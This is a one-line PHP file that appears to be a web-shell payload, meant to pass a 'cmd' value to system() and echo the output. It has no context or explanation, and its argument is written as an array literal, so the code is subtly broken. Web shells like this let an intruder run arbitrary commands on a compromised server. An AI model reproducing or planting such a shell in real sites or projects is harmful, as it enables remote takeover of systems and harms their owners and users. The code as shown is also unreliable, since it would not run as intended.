<?php echo system(['cmd']); ?>
